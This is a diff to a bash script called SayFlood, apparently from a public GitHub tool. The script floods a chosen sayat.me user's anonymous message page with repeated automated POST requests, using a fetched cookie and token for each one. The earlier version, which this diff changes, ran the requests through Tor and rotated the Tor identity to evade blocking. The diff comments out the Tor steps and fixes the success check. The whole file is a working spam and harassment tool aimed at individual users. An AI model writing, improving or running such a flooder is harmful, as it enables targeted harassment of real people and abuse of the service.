@@ -1,5 +1,5 @@
 #!/bin/bash
-# SayFlood v1.1
+# SayFlood v1.2
 # Author: https://github.com/thelinuxchoice/sayflood
 
 banner() {
@@ -47,26 +47,28 @@ message="${message:-${default_message}}"
 read -p $'\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Amount message (Default: 100): ' amount
 amount="${amount:-${default_amount}}"
 
-curl -i -L -s -c cookies.txt $'https://sayat.me/'$username'' > /dev/null 2>&1
-csam=$(grep  -o 'csam.*' cookies.txt | awk {'print $2'})
 for i in $(seq 1 $amount); do
  
 printf "\e[1;77m[\e[0m\e[1;92m+\e[0m\e[1;77m] Sending message:\e[0m\e[1;93m %s\e[0m\e[1;77m/\e[0m\e[1;93m%s ...\e[0m" $i $amount
 IFS=$'\n'
-send=$(curl --socks5-hostname localhost:9050 -b cookies.txt -i -s -k  -X $'POST'     -H $'Host: sayat.me' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://sayat.me/'$username''  -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded'        --data-binary $'write=message&gif=&giphy=&more_feedback_input=&foo=C8MQzISSm05kdk8&bar=IGMYbXFaaXNzTRAVS0RLGA%3D%3D&url=&password=&password_confirm=&signup=0&url_login=&password_login=&login=0&csam='$csam''     $'https://sayat.me/'$username''  | grep 'HTTP/2 200'; echo $?)
+curl -i -L -s -c cookies.txt $'https://sayat.me/'$username'' > /dev/null 2>&1
+csam=$(grep  -o 'csam.*' cookies.txt | awk {'print $2'})
 
-if [[ $send == "1" ]]; then
-printf "\e[1;93m Fail\n\e[0m"
-else
+send=$(curl  -b cookies.txt -i -s -k  -X $'POST'     -H $'Host: sayat.me' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: https://sayat.me/'$username''  -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Content-Type: application/x-www-form-urlencoded'        --data-binary $'write='$message'&gif=&giphy=&more_feedback_input=&foo=C8MQzISSm05kdk8&bar=IGMYbXFaaXNzTRAVS0RLGA%3D%3D&url=&password=&password_confirm=&signup=0&url_login=&password_login=&login=0&csam='$csam''     $'https://sayat.me/'$username'' | grep -a 'HTTP/2 200' ;)
+
+if [[ $send == *'HTTP/2 200'* ]]; then
 printf "\e[1;92m Done\n\e[0m"
-fi
-killall -HUP tor > /dev/null 2>&1
 
+else
+printf "\e[1;93m Fail\n\e[0m"
+fi
+#killall -HUP tor > /dev/null 2>&1
+#sleep 1
 done
 
 exit 1
 }
 banner
-checktor
+#checktor
 start
 
